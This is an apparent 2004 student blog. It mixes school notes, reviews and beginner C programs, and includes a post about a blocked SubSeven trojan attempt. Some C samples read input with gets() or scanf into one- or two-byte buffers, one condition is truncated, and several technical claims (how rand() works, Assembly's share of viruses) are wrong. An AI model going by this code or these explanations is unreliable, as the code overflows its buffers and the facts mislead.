+     
+
+    
+</post>
+
+<date>19,April,2004</date>
+<post>
+
+	 
+       On April 18, 2004, someone in New York attacked me. He used a Backdoor/SubSeven Trojan horse in attempt to break into my system. Luckily, I have Norton Internet Security. It blocked it almost instantly. His IP address was something like 80.196.235.154. If I didn't have the firewall, then god knows what would have happened. I used a simple tracking device and found out where he is. I can see that he is one of those script kiddies who donwload a source code of a trojan and try to connect to people's computer's with it. :( When will they learn, that to be a hacker, you have to write your own code.   I would suggest that anybody who do those kinds of things are losers and have no life. Not only are they wasting their time, but they are not learning anything. You see when I try to do certain kinds of things, I experiment and 80% of the time, I fail. But I moved on, I'm still standing, I'm still strong!  I warn all of you out there, whether you are downloading music, doing research or checking your e-mail, you never know who will attack you. If you are aware of your risk on the Internet, and don't have a firewall installed on your computer, then talk to Ñick and he'll hook you up with a Norton Firewall.  *Charges may apply. :}
+     
+
+    
+</post>
+
+<date>18,April,2004</date>
+<post>
+
+	 
+       Edgar Allan Poe was a successful, and brilliant writer, the reason to his extraordinary ability to make up short stories, and beautiful poems. In this report, I will talk about Edgar Allan Poe’s life, and the most famous poems that he wrote. His works are quite classic, because even though he wrote them 200 years ago, I still enjoy reading them very well. He mostly wrote fictional stories, and horror stories that people like the best. His very well known detective story Murders in Rue Morgue, is probably the very first detective story to be ever written, and is the most exquisite one of all. Poe is still remembered today because he is a talented writer that inspired many folks. I chose to do his biography because of his short horror stories are very well written, and his poems provide a deep meaning behind them. I find Edgar Allan Poe a fascinating person to learn about. His parents died when he was almost 2 years old. Here is one of his famous poems  Alone .   From childhood's hour I have not been As others were; I have not seen As others saw; I could not bring My passions from a common spring. From the same source I have not taken My sorrow; I could not awaken My heart to joy at the same tone; And all I loved, I loved alone. Then- in my childhood, in the dawn Of a most stormy life- was drawn From every depth of good and ill The mystery which binds me still: From the torrent, or the fountain, From the red cliff of the mountain, From the sun that round me rolled In its autumn tint of gold, From the lightning in the sky As it passed me flying by, From the thunder and the storm, And the cloud that took the form (When the rest of Heaven was blue) Of a demon in my view.  
+     
+
+    
+</post>
+
+<date>17,April,2004</date>
+<post>
+
+	 
+       If you still have trouble of questions about the computer programming languages, then you might want to check out these simple programs of different languages. They will all serve the same purpose and display the message "Hey Woodbine!” So then you will get an idea of how they look like behind the their function.   C   #include stdio.h #include conio.h  void main() { printf("Hey Woodbine!"); }   Java   public class HelloWorldApp { public static void main(String[] args) { // Display "Hey Woodbine!" System.out.println("Hey Woodbine!"); } }   Assembly   .model small .stack .data message db "Hey Woodbine!", "$"  .code  main proc mov ax,seg message mov ds,ax  mov ah,09 lea dx,message int 21h  mov ax,4c00h int 21h main endp end main   Python   >>> def hello(): ...print "Hey Woodbine!" ...    Visual Basic   Private Sub cmdHello_Click()     txtHello.Text = "Hey Woodbine!" End Sub 
+     
+
+    
+</post>
+
+<date>16,April,2004</date>
+<post>
+
+	 
+       If you enjoy spending time with computers, then you might as well take a look at some of the languages that people write to make programs, and everything else you can see from your computer. All you have to do is go to the library, find a book for the language that you want to learn more about, then read the book and that’s that! It will tell you everything that you have to know. Practice writing source codes, so as long as you got a computer, you're fine.  There are many, many, many programming languages that you could choose to learn. Some good ones to start with are Python, Perl, C, Visual Basic, Delphi and Basic. They don't require much energy and devotion to get started with, but if you want to learn something more interesting and exiting, then try to consider these; C++, Java and JavaScript, Assembly, and Visual Dev 6.  I’m already familiar with about six of the programming computer languages, and I have learned that learning one is not enough. Sure if you learn the whole C library, it will be very useful, but try to spend your time learning some of them, then decide the one you want to get in depth with. Believe it or no, Assembly is used to write 99% of the known viruses and trojans. This however, does not mean that it’s bad to learn Assembly. It is very advanced and deals with the hardware as well, so it’s best to know about that before you start looking at it. C is very common and a good language to learn. Java may be harder in the beginning, but it gets fun, because you make your own applets and games. Visual Basic is found build-in in your Microsoft Word. All you have to do is open Visual Basic on the toolbar, and then click Code.   I hope that you leaned something from reading this information, and that you will consider in writing source codes of your programming language. It will be very efficient for your resume if you’re applying in computer work field. So don’t be afraid. Experiment and explore. You may fall down on the rough road, but to get back up is the best thing you can do. Never say never, get some help and it will be straightforward after that. 
+     
+
+    
+</post>
+
+<date>13,April,2004</date>
+<post>
+
+	 
+       You have probably looked at, or searched for a good computer to buy, you probably heard the term "cache". Caching is an expertise supported on the memory subsystem of your computer. That means that it helps your computer be faster. There are L1 Cache and L2 Cache, which simple means level one and level two caches. You can use cache of a faster but smaller memory type to increase speed of a slower but bigger memory type. So now your computer will work faster with its bigger memory, because of the smaller-extra memory that helps it do things faster.   You think of it like a storage place from where you get your data. If you want to open a website, or a document, and it is already in the memory cache, the computer will load it heaps of time faster, than it would if it would have to search for it on your hard drive. Its like if you have a game CD already in your CD-ROM drive, you can load it without taking time to look for it and putting it in.  Not everyone has cache at level one, but in the future, anything is possible. When you get a new computer, make sure to get a microprocessor with cache, or you’ll have a hard time with time! 
+     
+
+    
+</post>
+
+<date>10,April,2004</date>
+<post>
+
+	 
+       Recently I have heard from Mr. Case, that the battle between the Internet companies and the music artists is over, or is it? Rogers, Simpatico, and other companies have won, even though the music production say that the people who use them download music of peer-to-peer programs like Kazaa, Morpheus, or just using FTP server. So right now it is supposed that it is free to download music for the time being, until they find another law that makes it illegal to do so. Mind you, uploading music is still illegal. We have to wait and see what happens next.  
+     
+
+    
+</post>
+
+<date>08,April,2004</date>
+<post>
+
+	 
+       We finally finished watching the great movie in the name of Anti-Trust. The name tell you everything, you can’t trust nobody. If you haven’t seen the movie, it is generally a movie about an intelligent programmer Matt Hoffman, and how he struggles to give justice to people who deserve it.   Along with his friends, Matt Hoffman is writing source codes for what the Synapse may need. Synapse is a global network that connects every digital device on the planet, so you can send images, text, or even videos to whomever you want. So the owner of the company, Gary, is requesting that Matt and his friend join their organization. Matt agrees, but his friend decides to stay. Matt notices strange things that start to happen and it all leads to Synapse. His friend gets murdered because he was close to finishing something up (perhaps a code string), and then Gary gets the codes out of nowhere.  So Matt then sneaks into the core of the buildings, past heavy security and discovers that he was right all along, the people of Synapse are stealing codes from people, by spying on them on their computer. Matt gets help from his friends and uses Synapse to broadcast the real video of what has been happening worldwide for everybody to see. Gary gets arrested, and Matt gets back in the garage, and made history. 
+     
+
+    
+</post>
+
+<date>06,April,2004</date>
+<post>
+
+	 
+       As you may know, Linux is an operating system that is very highly advanced, both in terms of networking, and programming. You may ask, why would someone use Linux, if they could use Windows? Windows is in fact very user friendly and easy to use, Linux on the other hand, is very difficult to use and is not recommended to novice computer people.  	 	The thing about Linux is that it is open source, meaning that you can download the source code, and then alter it anyway you want and send it back to the developers saying something like “Hey, I changed some stuff and added a few more cool features!”. So when you actually download Linux, it will be the work of millions of people really. Although some most people don’t do much, so it is important not to let all the stuff that people change get published on the website.   	There are two Linux systems, one is called Mandrake, and the other, more popular, is called Red Hat, which I recommend you all to get. Of course you need to have high-speed Internet, or to have someone with high-speed Internet to download it, because it is 2 GB is size! (1,800 MB) Remember, in order to download Red Hat, you need to download three files called shrike-i386-disc#.iso. Use the following links to download the necessary things that you may require:   Linux Red Hat 9 Downloads   urlLink http://ftp.redhat.com/pub/redhat/linux/9/en/iso/i386/    Linux Documentation   urlLink http://www.redhat.com/download/howto_download.html 
+     
+
+    
+</post>
+
+<date>04,April,2004</date>
+<post>
+
+	 
+       Kasimir Malevich was born in 1879, and passed away in 1935. He was born in Russia, and is still a very famous artist. He mostly drew geometry shapes to make his images with tremendous amounts of compositions. He is the one who founded suprematism, and is very passionate about it. Although his paintings may seem vulgar, they are amazingly high in cost. Observe some of his paintings that he did with oil on canvas.  I am also doing him as my painting stylist, so I'm drawing an image with his style and quality. He is from Moscow, and my parents have his book. Malevich is a very successful painter who should be remembered thoughout the art history. I hope that you find meaning in his paintings as well as think of how you may want to do your own.   &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 
+     
+
+    
+</post>
+
+<date>02,April,2004</date>
+<post>
+
+	 
+       I hope that you haven't forgot to hand in your properly formated, business letter. It's due today, and you mostly just have to write to a company about anything that you wish. Some examples are job employment, apologize letter, advertising letter, question letters, problem letter, anything you can think of. All you have to remember is to keep it formal and accurate. A single spelling mistake will result in a failure. Address it specific to the company, or a person. Avoid using "To Whom it May Concern", because its the most horrible thing you can do to a nice letter.  The format is very important in your letter, because the first thing the reader sees, is the appearance of your fine parchment. Even an excellent letter could be tossed away, because it is hard to read, or looks messy. Read on below my business letter basic formats for a quick, and easy explanations and examples of things that you should include when writing.  
+     
+
+    
+</post>
+
+<date>01,April,2004</date>
+<post>
+
+	 
+       So you’re thinking about writing a business letter to a company, and you want it to look very formal and serious. A business letter is not just any letter that you write to your grandparents, it has to be written with proper attitude. Since companies write tons of business letters to each other everyday, then there should be some sort of rules that we need to follow.   For example, people might be reading letters all day, so you have to make yours stand out so it wouldn’t find its way in the garbage. Remember that you want to examine the letter as to whom you are writing it to. So you must consider the subject matter, as well as writing it as clearly as possible, and get to your point quickly. I have seen many people babbling about nothing, and that won’t get you anywhere.   Read on about different sections that must be presented in your letter. You have to start your letter very casually, and the first sentence must be probably very important, so take some time to think about it. Here are the sections that we’ll be talking about, don’t worry if you are not familiar with some of them:   1.	Heading (Return Address) 2.	Inside Address 3.	Salutation (Greeting) 4.	Body (Paragraphs) 5.	Closing with Signature     Heading   The heading should include your contact information that the reader will be able to see first. It should include you name, address, phone number, and date the letter was written, or send out. If you own a company, then you ought to put your company logo. You could also choose to put it after your closing signature.     Inside Address   This is probably serves the same purpose as the heading, except that it has the recipient’s contact information. Make sure that your inside address contains the reader’s name, position, company/organization, and full mailing address. Make sure that it’s left justified.     Salutation   Any kind of letter, especially a business formal letter should include some kind of greeting to the reader. Try as much to make it personal rather than putting company’s name. For example, the reader would be very much obliged if you put Dear Dr. Green… rather than Dear Reader… To make it look even more professional, put a colon instead of a comma, even though it looks different. I saw hundreds of letters that have commas, and that usually means that the letter is not proficient. Using a colon is professional, and right in English terms. Some common salutations are;    Dear Sir or Madam: Dear Reader: To Whom it May Concern: Dear Ladies and Gentlemen: Dear [Company’s Name]:     Body   The body is the information section, where you talk about the purpose of your letter, and so forth. A classic cover letter has three paragraphs, opening, central point, and wrapping up to finish. Try to keep it maximum one page for best results. At the end of the letter, make some sort of a point on how to contact you. Make sure to clearly state the purpose of your letter as the most important idea, and support it. Making lists looks very casual, so if you see an opportunity such as a procedure, or a list of items, use it. Remember to leave spaces between paragraphs.     Finishing Up…   Remember to close your letter very casually. Examples of common closing formal letters include:                                                       Sincerely,                                               Best regards,  			Yours truly,    Don’t forget to capitalize the first letter. Include your signature, and type in your name at the bottom.   Reference:   urlLink http://writing.colostate.edu/references/documents/bletter/   urlLink http://owl.english.purdue.edu/handouts/pw/p_basicbusletter.html   urlLink http://rwc.hunter.cuny.edu/writing/on-line/b-letter.html   urlLink http://www.smcps.k12.md.us/mbms/writing/ltrforms.html  urlLink http://writing.colostate.edu/references/documents/bletter/ 
+     
+
+    
+</post>
+
+<date>29,May,2004</date>
+<post>
+
+	 
+       Yep. The finals are here for the NHL Stanley cup 2004. It looks like Toronto is out-like usual (they never give up do they?), and so is the rivals Detroit and Colorado. The only two teams are The Tempa Bay Lightning, and the Calgary Flames. The Flames managed to win their first game, but the Lightning put out the flames in the second. Their 3rd game is today, and I can’t wait to see who will win.   I like the Calgary Flames and Tempa Bay Lightning, because each team has a lot of Canadian players. I still want the Canadian team Calgary to take the cup, but I also want the Russian Havi Bullin, the Lightning’s goalie to take the win, because I was heartbroken when the Russians lost to the Americans in the Olympics. This time comes only once a year, so take the chance to see the most of it.  Jerome Iginla, the star player of the Calgary Flames, and also known as the best player in the league, has done an outstanding job. Vincent Lecavalier a.k.a the playmaker is also playing tremendosly with Martin St. Louis as the point scorer on the Tampa Bay Lightning. Who will win, watch the game today for Game 3.   
+     
+
+    
+</post>
+
+<date>28,May,2004</date>
+<post>
+
+	 
+       As you may already know, Shrek 2 came out and is a major hit. I haven’t seen it until today, and I got to hand it to the creators, it is hilarious. FUNNY!!!! I don’t know who came up with the jokes, but I sure liked it very much, and it was definitely worth five dollars out of my allowance.   The computerized graphic movie follows Fiona and Shrek on their honeymoon. Little do they know that Fiona’s parents are planning to set her up with a charming prince. But when they see their true daughter’s identity and fiancé, they don’t seem too happy. Follow the charming voice of Antonio Banderez, funny Mike Myers and Edward Murphy, along with Cameron Diaz as Fiona and you’ll have tons of laughs and surprises.     
+     
+
+    
+</post>
+
+<date>27,May,2004</date>
+<post>
+
+	 
+       Here are the top movies that hit box office this week:      Title        Total Money Made  1)  Shrek 2      $128,983,060    2)  Troy         $85,960,779    3)  Van Helsing  $100,526,335    4)  Mean Girls   $64,706,896    5)  Man on Fire  $69,461,524 
+     
+
+    
+</post>
+
+<date>25,May,2004</date>
+<post>
+
+	 
+       Yes, the final assessment of the computer course is here. The most gruesome, difficult, complex and elongated project of all-making business! Well not really, making business actually teaches you a lot of things like how to set up a business in Ontario; the steps that will make you succeed. I find it very, very interesting and not difficult at all. Mr. Case has explained virtually everything you need to know to get an A on this.   There are basically four tasks:  1)Create a Business 2)Soliciting Work 3)Preparing a Product  4)Presenting your Proposal.  I am still working on my first one, and I can’t wait to get on with my second. Here are the things that should be completed when   (a)Choose a Business Name (b)Register a Business Name  (c)Create a Logo (d)Create Letterhead (e)Create a Business Card (f)Print out the Trade Mark Search Results (g)Make sure you have all your work in the folder provided in class 
+     
+
+    
+</post>
+
+<date>24,May,2004</date>
+<post>
+
+	 
+       The commercial was definitely well composed, showing mankind’s deepest threat- the big storm. It is the storm that happens every 10,000 years and destroys everything and everyone on the planet Earth. Where will you be?   I really want to see the tidal waves crashing down the street, the twisters roaming around and the hurricanes blowing everything out of their way, but if the movie is more than two hours long, there still has to be some more to it. That is why I’m planning to see the movie.    
+     
+
+    
+</post>
+
+<date>23,May,2004</date>
+<post>
+
+	 
+       The NBA playoffs are slowly winding down to the Finals, and it is still a close battle between the teams in the Eastern and Western division. In the East, it’s the Los Angeles Lakes against the Minnesota Timerwolves. The Rockets and the Indiana Pacers are battling their way from the West.   My thoughts are that the Lakers just sort of bought their way into the finals with their star players-Kobe Bryant, Shekel O’Neal and Gary Payton. The MVP (most valuable player) of the year is Kevin Garnet, who is leading his team to the Finals.   
+     
+
+    
+</post>
+
+<date>21,May,2004</date>
+<post>
+
+	 
+       The following program is written in C, and it randomizes a mark for the subject that you choose, so there is no rules to what you may get! The new function here is (rand) which is the code for a random number. The number however is not  really  random, but it is a number from the binary waste of the CPU storage. So there is some binary code that hangs around the computer that will jump onto the space provided for it everytime you load the program.     #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;conio.h&gt;  main() { 	char sub[1]; 	int subject;  	printf("Welcome! I am the computer genie.\n");   	printf("I can find out your school marks.\n\n");   	printf("Please choose the subject that you want to know your marks for:\n"); 	printf("(1)Math \t (2)English \t (3)Science \t (4)Geography \t (5)Computers\n\n"); 	gets(sub); 	subject=atoi(sub); 	 	if(subject==1) 	{ 		int rand(); 		int r; 		 		r=rand(); 	 		printf("\n\nYou mark is %i percent!\n\n",r); 	}  	if(subject==2) 	{ 	 		int rand(); 		int r; 		 		r=rand(); 	 		printf("\n\nYou mark is %i percent!\n\n",r); 	 	} 	 	if(subject==3) 	{ 	                                                 		int rand(); 		int r; 		 		r=rand(); 	 		printf("\n\nYou mark is %i percent!\n\n",r); 	} 	 	if(subject==4) 	{ 	                                                 		int rand(); 		int r; 		 		r=rand(); 	 		printf("\n\nYou mark is %i percent!\n\n",r); 	} 	 	if(subject==5) 	{ 	 		int rand(); 		int r; 		 		r=rand(); 	 		printf("\n\nYou mark is %i percent!\n\n",r); 	}     system("PAUSE"); return 0; }   
+     
+
+    
+</post>
+
+<date>20,May,2004</date>
+<post>
+
+	 
+       The will be a typing test on Friday, and if not then on the next class. It is very important to be able to type properly. You have to remember to type accurately, not to worry abour speed. My best preparation is to type something without looking at the keyboard and not making mistakes. During the test, your hands will be covered and you will not be able to look at your hands.  When you practise typing, make sure that you learn the Home Row first, before moving on to the top and bottom rows. I would suggest that everyone would try and make their best effort into accomplishing that. Typing is a very serious and helpful skill that should not be put aside.  Here is a keyboard layout that you should learn by heart and would never bother to look down onto the keyboard(my laptop):     
+     
+
+    
+</post>
+
+<date>19,May,2004</date>
+<post>
+
+	 
+       Here is another program written in C that is sort of like a madlib game that allows you first to make up some words, then put them into phrases. This one is very simple, so you could get the gist of it.  First of all, it will ask you to enter a couple of things. Everytime you enter something and press enter, it will be saved into a created variable. Then at the end, it will display a phrase with the variables that you already put your information into. Try to make up your own madlib with this code:       #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;conio.h&gt;  void main() { 	char name[10]; 	char adjective[10]; 	char adjective2[10]; 	char food[10]; 	char place[20]; 	char quit[20]; 	 	printf("Enter your name:"); 	scanf("%s",name); 	printf("Enter an adjective:"); 	scanf("%s",adjective); 	printf("Enter another adjective:"); 	scanf("%s",adjective2); 	printf("Enter a food:"); 	scanf("%s",food); 	printf("Enter place:"); 	scanf("%s",place); 	 	printf("\n\n%s is very %s and %s. \n\n",name,adjective,adjective2); 	printf("%s likes to eat %s in the %s. \n \n",name,food,place); 	 	getche(); 	 	return 0; }    
+     
+
+    
+</post>
+
+<date>18,May,2004</date>
+<post>
+
+	 
+       The following program is written in the C computer language and what it basically does, is that it asks you to type a number between 1 and 10. Then it will say whether the number is bigger than five, smaller than five, or five!     #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;conio.h&gt;  void main() { 	char num[2]; 	int number; 	 	printf("Welcome, I am your computer genie!\n\n"); 	printf("Enter any number from 1 to 10:"); 	scanf("%s",num); 	number=atoi(num); 	 	if(number 	{ 		printf("\nThe number is lower than five!\n\n"); 	} 	else if(number>5) 	{ 		printf("\nThat number is higher five!\n\n"); 	} 	else if(number==5) 	{ 		printf("\nThat number is five!\n\n"); 	} 	printf("The genie knows all!"); 	                                 	getche(); 	 	return 0; }   
+     
+
+    
+</post>
+
+<date>17,May,2004</date>
+<post>
+
+	 
+       It lookes the the tennis palyer and model Anna Kornikova and the Italian singer Enriqoe are still together. They ar spending time with each other quite a lot, if you know what I mean :)   
+     
+
+    
+</post>
+
+<date>16,May,2004</date>
+<post>
+
+	 
+       There are many kids in computer class who say bad things about our old and cheap $400 computers. Well right now we got a whole new set of Pentium 3s, which are more faster, have more drive space and are much more convinient for us students to use.     One Pentium III has about 128 MB RAM of memory, and close to 10 GB of disk space. That is a big improvement over our last computers. Everyone in grade 9 computers did research and presenation on computer parts, so everyone should know about the new Pentium 3s. They also have Windows 2000 installed on them and take much faster to load.      The problem that we have been having, is that kids like to download all the junk from the Internet, such as Kazaa, Messengers and spyware, which consumes the memory-resulting in descreasement of computer speed to load files, as well as space used by students. This could also be considered a security issue, because spyware could be using our computers to process their information. The good thing is that a better anti-virus is installed on them- McAfee which should do a good job of protecting the information.
+     
+
+    
+</post>
+
+<date>15,May,2004</date>
+<post>
+
+	 
+       All the grade 9s are doing their science projects this week, on anything that they learned this year. The projects are due next week, so I won't be suprised if everybody is bust this weekend. My partner is Frank, and we're doing the structure of DNA. We are going to have a report on DNA, bristol board loaded with pictures and information, as well as a model of DNA that we made. Here is a small portion of our report:   "DNA is also known as Deoxyribonucleic Acid. It is a thin molecule with a form of a chain that is generally found in every living cell on our planet. It directs the formation, growth, and reproduction of cells and organisms. Short sections of DNA called genes determine heredity. Heredity is the passing on of characteristics in living things. DNA is found mainly within a cell’s nucleus, in thread-like structures called chromosomes. DNA even occurs in bacterial cells, which do not have a nucleus, and in some viruses.   All DNA consists of thousand of smaller chemical units nucleotides. Nucleotides are chemically bonded to one another to form, thin, chainlike molecules known as polynucleotides. Each nucleotide contains a compound called phosphate, a sugar called deoxyribose, and a compound called base. The phosphate and sugars are the same in all DNA nucleotides, but the bases vary. There are four DNA bases: adenine, guanine, thymine, and cytosine. The exact amount of each nucleotide and the order of in, which they are arranged, are unique for every living thing."   I find it fascinating, and think that we should continue to study it, and expand our knowledge of biology. Here are some of the pictures that I found while doing research on the subject:       
+     
+
+    
+</post>
+
+<date>14,May,2004</date>
+<post>
+
+	 
+       Troy is coming out Friday, May 14, 2004. It is supped to be a really remarkable movie this year. The reviews are pretty decent, so don't be afraid that you'll waste your money. Trust me, it's worth it. The movie is starring Brad Pitt, Eric Bana, Orlando Bloom, Rose Byrne, Peter O'Toole, Brian Cox, and Diane Kruger. The director is Wolfgang Petersen. He also directed Air Force One, Perfect Storm, The Patriot and In The Line of Fire.The movie is about 3 hours long, but it felt like a sweep of time has gone past.    The story basically follows Paris, who stole the queen of Spara. The King got angry and went on to war with him and the Trojans. I saw the movie today and it taught me a lot about the myth of Achilles and the tricky trojans.        
+     
+
+    
+</post>
+
+<date>13,May,2004</date>
+<post>
+
+	 
+       Believe it or not, good typing skills lead to great paying jobs. It is a great specification if you are able to type fast and accurate. Trust me on this, if you like to type with 2 or 3 fingers, STOP NOW! Start to learn to type properly because the sooner you begin to learn, the easier it will be for you.   There are several programs that should help you doing that. They calculate your speed; have fun games, lessons and many drills for you to practice with. Two that I find one of the best are Mavis Beacon, and All The Right Type. You have probably heard about the All The Right Type software, since many of the schools use it. I have found that you could download it from the net; I will give you the address later on. You have to start with the first row, whether you type slow or fast. Then when your fingers respond automatically to what you’re seeing, then you can move on to the next lesson. Each lesson will have new keys for you to learn and practice. You can even practice without the softwares, just type with your fingers on the home row, and type the letter with the closest finger. It may take a lot of time and effort n the beginning, but it will serve you in ways that you have not thought possible later on in your life.  Here are some sites that you could download typing softwares from, remember that they’re just trial, you can try using them for a limited time, or with limited functions. To get the full program, just order it online and receive a serial number, or whatever they have in they right minds.   All The Right Type:  urlLink www.ingenuityworks.com/  Mavis Beacon:  urlLink www.mavisbeacon.com/    
+     
+
+    
+</post>
+
+<date>12,May,2004</date>
+<post>
+
+	 
+       It amazes me that most people still wonder and question when they hear “And1”. For those of you who don’t know, it is a way of playing basketball with style and breaking-ankles moves. This could also be referred as street ball. It is not like in the NBA, where they play so simple by passing the ball and draining jump shits. NBA has very tight defense that is hard for even Allen Iverson to break through, since he was a street baller. In street ball, you see many more dunks and crossovers. Here are some videos of the moves that you can find people like Hot Sauce use:         
+     
+
+    
+</post>
+
+<date>11,May,2004</date>
+<post>
+
+	 
+       It has come to my attention that people are burning and burning CDs containing music, games and documents. First of all I want you guys to know that there are two basic types of CDs, the CD-R and CD-RW kind. CD-R does not allow you to replace, or delete files of the CD when you have burned stuff on it. This could be useful if you are burning important documents that you think you will be using later on, such as games. You will not delete any files of the game CD because it would not play. If you are, however, burning something temporary, like music, where the style changes every time, you can use CD-RW, in which you could erase, replace and add stuff on the CD for all the eternity if you treat the disk right.  Some of the problems that I want people to know is you mustn’t remove the disk while it is being burned, many number of times it will be ruined and you will never be able to use it again. It happened to me once and I took good note of it. Another thing is never to write on the CD, that is why you put the paper inside the holder in the front. Many times I see people scratch on the label with a pen, and later find that it doesn’t work and wonder why.  If you would like to do some of that stuff, then I suggest you get a CD burner, or a DVD burner. You need to have on your computer in which you could transfer data from one to another. About this time, it should cost you about a hundred dollars, unless you want to buy a new computer, in which most of them has included. Then you need to get burning software that will organize everything. The best on there is called “Nero”, whether you like it or not. So when you have these two things, you should be fine. 
+     
+
+    
+</post>
+
+<date>10,May,2004</date>
+<post>
+
+	 
+      Mr. Case talked to us today about the new blogger features that became available. The site certainly went under a lot of work to make this fantastic change. I think it is because they want it to be more user-friendly, and more popular. So they could say that blogger is updated, bringing many users to check what's up, and tell their friends. It is already popular, but with new features and more templates, it is even better. It has completely new interface that I'm sure everybody liked who were blogger users before the change.      The templates, as I have mentioned, have certainly increased in size and variety, leaving you with all the choices for you to choose. The new blogger could allow you to make a profile with a picture. The formatting also has changed, with more different and looking better images and steps. I noticed there is a link called dashboard, which is like a link to the home page, in which you can access anything you want.      You might ask, why is it changing? Maybe because it wants to do something to blogger users that they could be linked to Gmail? The end-user agreement could also be changed that could make a statement that you did not know of. I think that blogger just wanted to change; it is not really looking forward to tricking people into using it. It might be attracting people to the new Gmail account with 1 GB of mail storage. It was said that GMail uses spiders that scan you mail and determine what products you are interested in, leaving you with the possibility of receiving spam! Perhaps, what Blogger is trying to do, is to scan the your posts and then send that info to the GMail, which will then send you more junk that you didn't ask for. This may sound very dangerous. It sound very effective, but we still don't know yet.     Overall, Blogger is an excellent tool to use to make your page with simple posts. Even someone who doesn't know anything about making web pages, and html source codes, could easily use blogger. I would not be surprised if it would start charging people.
+     
+
+    
+</post>
+
+<date>09,May,2004</date>
+<post>
+
+	 
+      Pages like these have a special code inside the body that links music files from other sites to play when the page loads. This could be done by inserting an html code that looks something like this:  ( )  This code calls the .midi file from the page, it starts automatically, it is hidden in the background, and it will restart itself every time it ends (looping). So its okay to add some spicy to your website, and would be better if the content matches the sound.  To insert a music file, you can go and search for some websites, or visit http://www.christiananswers.net/midimenu.html for some classical songs that I play on my blog. Go to the blogger template, and between the body tags, insert the code with the music that you prefer. If you have any questions, ask me in my guest book. 
+     
+
+    
+</post>
+
+<date>07,May,2004</date>
+<post>
+
+	 
+       I have looked at  urlLink Omid's Blog  and found out that he wants to do a program in C++ that will make simple calculations like adding and multiplying. I figured to do mine in C, so check his blog in a while so you could see the real difference between the two most common used computer languages today.   Here is a program that will ask you what you wish to do; add, substract, divide or multiply. then it will ask you for two numbers to perform the functions on. Say you entered 1, it will call the function (if you entered 1, do this...) so it will perform adding. Download the .exe file from  urlLink HERE  to test it on your computer.     #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;conio.h&gt;  void main(void) {  	char num[1]; 	int number; 		     int add1; 	int add2; 	int addfinal; 	 	int sub1; 	int sub2; 	int subfinal; 	  	int mul1; 	int mul2; 	int mulfinal;	  	   	int div1; 	int div2; 	int divfinal; 	 	printf("Welcome, I am the computer genie!\n"); 	printf("First tell me what you wish to be doing:\n\n"); 	printf("1-Addition \t 2-Subtraction \t 3-Multipication \t 4-Division \t 5-Exit\n\n"); 	gets(num); 	number=atoi(num); 	 	if(number==1) { 	printf("\nExcellent! Now type the first number:"); 	scanf("%i",&add1); 	printf("\n Now type the second number:"); 	scanf("%i",&add2); 	addfinal=add1+add2;   	printf("\nThe sum of those two numbers is %i\n\n",addfinal); }	 	else if(number==2) { 	printf("\nExcellent! Now type the first number:"); 	scanf("%i",&sub1); 	printf("\n Now type the second number that you wish to substract:"); 	scanf("%i",&sub2); 	subfinal=sub1-sub2;   	printf("\nThe answer is %i\n\n",subfinal); }  	else if(number==3) { 	printf("\nExcellent! Now type the first number:"); 	scanf("%i",&mul1); 	printf("\n Now type the second number:"); 	scanf("%i",&mul2); 	mulfinal=mul1*mul2;   	printf("\nThe product of those two numbers is %i\n\n",mulfinal); }  	else if(number==4) { 	printf("\nExcellent! Now type the first number:"); 	scanf("%i",&div1); 	printf("\n Now type the second number that you wish to divide:"); 	scanf("%i",&div2); 	divfinal=div1/div2;   	printf("\nThe answer is %i\n\n",divfinal); } 	else 	{ 	printf("I don't understand you mann!"); 	}  	 	printf("Press any key to quit..."); 	getch(); 	 	return 0; }   
+     
+
+    
+</post>
+
+<date>06,May,2004</date>
+<post>
+
+	 
+       Many of you who have and write blogs, must surely know about the new gmail offer that offers 1 Gigabyte of free email storage. But is there a catch? There sure it! GMail scans your messages and outs in advertisement. Should the free offer cosume our privacy? Gmail may be soon on of the most popular mail directories around the world. Here are some of the leaders:  Yahoo!:  56.6 million users  Hotmail:  45.4 million users  AOL:  40.2 million users   Source:   urlLink http://www.cnn.com/2004/TECH/internet/04/06/google.email/index.html 
+     
+
+    
+</post>
+
+<date>05,May,2004</date>
+<post>
+
+	 
+       I hope that many of you are familiar with the programming languages C and C++. C++ sounds more complex, but is there really much of a difference? I have learned much about C and haven’t really looked at C++. When I stopped learning about it, I decided to look at C++. I have found that it is really an expansion of the previous one, with some changes in the code, and a lot more complex in the end. For example, “printf” or “get” in C would mean to display a message on the screen, but in C++, you use the “cout ” command.  Not a while ago, a new language came known as C# (c sharp) and is said to be really good to learn. I haven’t really looked into it, but it is really neat if you’re into programming. 
+     
+
+    
+</post>
+
+<date>04,May,2004</date>
+<post>
+
+	 
+       This may seem like some sort of joke, but it is really the name of the book. The author of “Who Moved My Cheese” is Spencer Johnson. It is #1 bestseller in New York Times, Wall Street Journal, Business Week, and USA Today Money. Believe it or not, the book has only less than 100 pages. It’s more like a short story and it has three parts. The middle is about 60 pages-that’s the core/main story. It took me only one night to finish it and cost me $30 in Canadian.  The story if the book is very simple and easy to read, but it still serves life purpose. It has changed many people’s lives that were in jeopardy or some kind of trouble. It’s about four characters-two mice, and two littlepeople who are in a maze and are searching for cheese everyday. “Cheese” is a metaphor of what you want to have in life, whether it’s a good family, job, or house. The “Maze” is where you search for it. If you work hard to find it, you probably will. One of the characters learned that something and wrote about on the walls for you to see.  I recommend  everybody  to read this book. Why? Because it takes you less than an hour to read, and could enlighten you whole perspective in life. It is better recommended for people who are mature, have jobs, etc. That is why a lot of businesses are fortunate for this book, and it’s up to you to find out how. Just go to the Toronto Public Library website ( urlLink click here),  and search for the book and place hold it using your library card number and the last four digits of your phone number. Voila! 
+     
+
+    
+</post>
+
+<date>03,May,2004</date>
+<post>
+
+	 
